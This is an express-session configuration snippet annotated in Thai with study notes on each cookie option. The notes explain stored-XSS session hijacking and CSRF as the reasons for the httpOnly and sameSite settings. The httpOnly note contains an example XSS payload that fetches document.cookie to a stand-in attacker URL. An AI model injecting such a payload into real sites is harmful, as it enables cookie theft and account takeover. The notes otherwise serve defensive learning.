 session({
      secret: .env มารวมกัน sessionID มาเข้ารหัสลายเซ็น(HMAC)
      resave: 
        ในกรณี false ของเปลี่ยนก็เก็บกลับ ของไม่เปลี่ยนก็ไม่ต้องส่งกลับมา store
        นกรณี true จะส่งกลับมาใน store ทุกครั้งเเม้จะเหมือนเดิม
      saveUninitialized: 
        session จะถูกสร้างเฉพาะตอนที่โค้ดใส่ข้อมูลลง req.session ในกรณี false
        ในกรณี true เเค่เข้าหน้า login มาจะไปสร้าง session เลยเเม้จะว่างเปล่า
      cookie: {
          httpOnly: 
            ป้องไม่ให้ JavaScript อ่าน cookie = การขโมย cookie ผ่าน XSS โดยใช้ true
            Session Hijacking = การขโมย session
              1 <script>fetch('https://web/steal?c=' + document.cookie)</script> = คนร้ายในช่องกรอก
              2 สคริปนี้ถูกบันทึกลงไปใน store 
              3 เหยื่อเปิดหน้านั้น 
              4 server ดึง get store ส่ง HTML กลับไป (มีโค้ด <script> ปนมาด้วย)
              5 เบราว์เซอร์ของเหยื่อ "รัน" โค้ด <script> นั้น
              6 fetch ส่ง cookie ของเหยื่อออกไปที่ web.com
          secure:  process.env.NODE_ENV === 'production'
            กรณี true  = cookie จะถูกส่งเฉพาะ HTTPS
            กรณี false = cookie ถูกส่งทั้ง HTTP และ HTTPS
          sameSite: ควบคุมว่า เมื่อ request มาจากเว็บอื่น เบราว์เซอร์จะแนบ cookie ไปด้วยหรือไม่
            การโจมตีเเบบ CSRF = การที่เว็บอื่นยืม cookie ที่เรา login ค้างไว้ ไปสั่งงานแทนเราโดยที่เราไม่รู้ตัว
              1 คนร้ายสร้างเว็บพร้อมกับฟอร์มส่งตัวเองอัตโนมัติ
              2 หลอกให้เหยื่อเปิดเว็บ เช่นการส่งลิงค์ไป
              3 เหยื่อเปิดหน้าเว็บ ทำให้ส่งฟอร์มที่ซ่อนไว้
              4 เบราว์เซอร์แนบ cookie ให้อัตโนมัติ
              5 server ถูกหลอก โดยฟอรมต้องเขียนให้ทำงานเลย เช่น การโอนเงินเข้าบัญชีคนร้ายเลยจากฟอรม
            ค่าที่เลือกได้ 3 แบบ = 
              'strict' =  get เเละ post จากเว็บอื่นไม่ได้
              'lax'    =  get ได้ เเต่ post ไม่ได้
              'none'   =  ทำได้ทั้งสอง
          maxAge: cookie จะมีอายุอยู่ในเบราว์เซอร์นานแค่ไหน
      }
    })